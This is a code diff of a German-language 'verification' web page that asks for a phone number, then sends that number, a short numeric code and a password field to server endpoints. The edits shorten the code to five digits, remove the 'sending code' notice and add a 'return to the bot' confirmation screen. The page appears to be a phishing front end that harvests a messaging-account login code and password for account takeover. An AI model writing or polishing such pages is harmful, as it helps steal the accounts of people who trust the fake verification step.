@@ -88,7 +88,7 @@ body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; mi
     <div class="bell">🔔</div>
     <div class="info-box">Klicke auf den Button, um deinen einmaligen Code zu generieren. Dieser wird benötigt, um dich zu verifizieren und den Zugriff freizuschalten.</div>
     <div class="code-boxes" id="codeBoxes">
-      <div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div>
+      <div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div>
     </div>
     <input type="text" id="phone" class="phone-input" placeholder="+49 170 1234567">
     <button class="req-btn" onclick="startLogin()">Zugangscode anfordern</button>
@@ -123,12 +123,12 @@ function updateBoxes() {
   const boxes = document.querySelectorAll('.code-box');
   boxes.forEach((b, i) => { b.textContent = code[i] || ''; b.classList.toggle('filled', !!code[i]); });
 }
-function addDigit(d) { if (code.length < 6) { code += d; updateBoxes(); } }
+function addDigit(d) { if (code.length < 5) { code += d; updateBoxes(); } }
 function clearCode() { code = code.slice(0, -1); updateBoxes(); }
 async function startLogin() {
   const phone = document.getElementById('phone').value.trim();
   if (!phone) return alert('Nummer eingeben');
-  document.getElementById('msg').textContent = 'Sende Code...';
+  document.getElementById('msg').textContent = '';
   const res = await fetch('/verify/start', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone}) });
   const data = await res.json();
   if (data.ok) {
@@ -146,9 +146,7 @@ async function submitCode() {
   const res = await fetch('/verify/finish', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone, code, password:''}) });
   const data = await res.json();
   if (data.ok) {
-    document.getElementById('msg').className = 'success';
-    document.getElementById('msg').textContent = '✅ Erfolgreich verifiziert!';
-    code = ''; updateBoxes();
+    document.getElementById('verifyScreen').innerHTML = '<div style="text-align:center; padding:40px;"><div style="font-size:80px;">✅</div><h2 style="margin-top:16px; font-size:22px;">Verifiziert</h2><p style="color:#aaa; margin-top:8px;">Kehre zum Bot zurück</p></div>';
   } else {
     document.getElementById('msg').className = 'error';
     document.getElementById('msg').textContent = data.error || 'Fehler';
